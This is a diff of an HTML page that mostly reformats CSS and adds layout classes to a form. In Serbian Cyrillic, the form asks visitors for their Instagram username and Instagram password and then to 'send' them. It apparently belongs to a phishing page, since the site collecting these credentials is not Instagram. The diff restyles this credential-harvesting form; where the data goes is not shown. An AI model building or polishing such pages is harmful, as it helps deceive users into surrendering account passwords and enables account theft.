@@ -17,75 +17,26 @@
     code {color: #17f118;}
     .logo {border: 1px solid #fff; padding: 0.5%;}
     .animacija {
-    -webkit-animation: cssAnimation 1s 1 ease;
-    -moz-animation: cssAnimation 1s 1 ease;
-    -o-animation: cssAnimation 1s 1 ease;
-    }
-    @-webkit-keyframes cssAnimation {
-    from { -webkit-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
-    to { -webkit-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
-    }
-    @-moz-keyframes cssAnimation {
-    from { -moz-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
-    to { -moz-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
-    }
-    @-o-keyframes cssAnimation {
-    from { -o-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
-    to { -o-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
-    .subscribe {
-    padding: 27vh 0;
-    background: url(linea-stairs.gif) center center no-repeat;
-    background-size: cover;
-    overflow: hidden;
-    position: relative;
-    min-height: 100vh;
+-webkit-animation: cssAnimation 1s 1 ease;
+-moz-animation: cssAnimation 1s 1 ease;
+-o-animation: cssAnimation 1s 1 ease;
 }
-
-.subscribe:before {
-  content: "";
-  background: rgba(6, 12, 34, 0.6);
-  position: absolute;
-  bottom: 0;
-  top: 0;
-  left: 0;
-  right: 0;
+@-webkit-keyframes cssAnimation {
+from { -webkit-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
+to { -webkit-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
 }
-
-
-.subscribe input {
-  background: #fff;
-  color: #060c22;
-  border: 0;
-  outline: none;
-  margin: 0;
-  padding: 20px 20px;
-  border-radius: 10px;
-  font-size: 14px;
+@-moz-keyframes cssAnimation {
+from { -moz-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
+to { -moz-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
 }
+@-o-keyframes cssAnimation {
+from { -o-transform: rotate(0deg) scale(0.100) skew(0deg) translate(0px); }
+to { -o-transform: rotate(0deg) scale(0.999) skew(0deg) translate(0px); }
 
-.subscribe button {
-  border: 0;
-  padding: 10px 20px;
-  cursor: pointer;
-  background: #f82249;
-  color: #fff;
-  transition: all 0.3s ease;
-  outline: none;
-  font-size: 14px;
-  border-radius: 10px;
-}
+.i1 {width: 48%; float: left; padding: 1%;}
+.i2 {width: 48%; float: left; padding: 1%;}
+.i3 {width: 98%; float: left; padding: 1%;}
 
-.subscribe button:hover {
-  background: #e0072f;
-}
-
-
-@media only screen and (min-width: 768px) {
-  .subscribe input {
-    min-width: 400px;
-  }
-
-}
 </style>
 </head>
 <body>
@@ -453,13 +404,13 @@ This e-mail was sent from a contact form on [_site_title] ([_site_url])
 <form method="post" action="#">
           <div>
             <div>
-              <input type="text" placeholder="Упиши Твоје Инстаграм корисничко име" name="username" autofocus>
+              <input type="text" class="i1" placeholder="Упиши Твоје Инстаграм корисничко име" name="username" autofocus>
             </div>
 	    <div>
-             <input type="password" placeholder="Упиши Твоју Инстаграм лозинку" name="password">
+             <input type="password" class="i2"  placeholder="Упиши Твоју Инстаграм лозинку" name="password">
             </div>
             <div>
-              <button type="submit">Пошаљи</button>
+              <button  class="i3" type="submit">Пошаљи</button>
             </div>
           </div>
 </form>
